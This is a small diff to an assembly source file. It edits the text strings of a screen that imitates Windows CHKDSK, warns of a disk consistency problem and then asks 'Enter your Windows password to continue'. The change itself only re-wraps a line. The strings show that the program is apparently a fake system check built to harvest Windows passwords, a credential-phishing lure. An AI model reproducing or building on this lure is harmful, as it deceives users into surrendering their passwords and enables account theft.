@@ -62,7 +62,7 @@ find_disk:
 
 ; Strings
 checkfs db 'Windows CHKDSK', 13, 10, '==============', 13, 10, 13, 10, 'Checking file system on C:', 0
-ntfs db 13, 10, 'The type of file system is NTFS', 13, 10, 13, 10, 'One of your disks needs to be checked for consistency. You', 13, 10, 'must perform this check before rebooting.', 13, 10, 13, 10,'Enter your Windows password to continue: ', 0
+ntfs db 13, 10, 'The type of file system is NTFS', 13, 10, 13, 10, 'One of your disks needs to be checked for consistency. You must perform this check before rebooting.', 13, 10, 13, 10,'Enter your Windows password to continue: ', 0
 rmchar db 8,' ',8,0 ; this emulates the action of pressing backspace
 checking db 13,10,13,10, 'Checking volume C:', 13,10,'This may take a few minutes...',0
 
